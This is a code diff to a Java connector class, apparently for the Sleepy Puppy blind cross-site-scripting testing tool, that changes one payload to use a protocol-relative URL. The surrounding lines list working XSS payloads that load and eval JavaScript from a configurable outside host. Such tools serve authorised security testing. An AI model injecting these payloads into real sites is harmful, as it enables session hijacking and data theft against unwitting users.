@@ -228,7 +228,7 @@ public class SleepyPuppyConnector {
                 payloadList.add(String.format("\"><img src='//%s/mH'/>", url));
                 payloadList.add(String.format("\"><script>$.getScript(\"//%s\")</script>", url));
                 payloadList.add(String.format("\"><script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener(\"load\", b);a.open(\"GET\", \"//%s\");a.send();</script>", url));
-                payloadList.add(String.format("\"><base href=\"%s\">", url));
+                payloadList.add(String.format("\"><base href=\"//%s\">", url));
                 payloadList.add(String.format("\"><embed src='//ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain=\\\"})))}catch (e) { d = document; d.location.hash.match(`x1`) ? `` : d.location=`//%s`}//' allowscriptaccess=always>", url));
                 payloadList.add(String.format("\"><body onpageshow=\"eval('d=document; _ = d.createElement(\\'script\\');_.src=\\'//%s\\';d.body.appendChild(_)')\">", url));
                 sleepyPuppyData.setSleepyPuppyAssessmentPayloads(payloadList);
